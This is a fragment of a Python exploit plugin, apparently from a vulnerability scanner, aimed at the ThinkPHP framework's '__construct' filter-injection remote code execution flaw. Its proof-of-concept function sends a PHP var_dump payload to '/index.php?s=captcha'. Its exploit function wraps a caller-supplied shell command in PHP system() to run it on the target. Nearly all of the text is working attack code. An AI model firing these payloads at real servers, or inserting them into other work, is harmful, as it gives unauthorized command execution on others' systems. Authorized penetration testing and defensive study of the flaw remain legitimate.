...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        req = urllib.request.Request(url + "/index.php?s=captcha",data="_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php var_dump('xiaohei');?>&server[]=1".encode("utf-8"),headers=heads)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            ...
            result = {"Result":False,"Result_Info":"payload"}
            context = ssl._create_unverified_context()
            data ="_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php system('"+exp_data['command']+"');?>&server[]=1"
